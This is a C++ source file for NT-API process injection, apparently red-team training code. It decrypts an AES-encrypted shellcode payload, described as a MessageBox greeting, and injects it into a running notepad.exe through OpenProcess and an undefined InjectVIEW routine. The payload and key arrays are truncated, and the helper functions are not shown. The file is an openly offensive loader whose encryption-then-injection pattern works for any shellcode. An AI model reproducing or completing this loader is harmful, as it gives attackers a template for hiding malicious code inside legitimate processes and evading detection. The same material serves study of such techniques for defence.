// nt_api_process_injection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <winternl.h>
#include <windows.h>
#include <vector>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// MessageBox shellcode 'Hi from Red Team Operator' - 64-bit
unsigned char payload[] = { 
    0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8,  0x50, 
    // ...
    0x6,  0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
unsigned char key[] = { 0xc0, 0xa6, 0x8b, /*...*/ 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };

unsigned int payload_len = sizeof(payload);


int main(void) {

    int pid = 0;
    HANDLE hProc = NULL;

    pid = FindTarget("notepad.exe");

    if (pid) {
        printf("Notepad.exe PID = %d\n", pid);

        // try to open target process
        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid);

        if (hProc != NULL) {
            // Decrypt and inject payload
            AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));
            InjectVIEW(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }
    return 0;
}
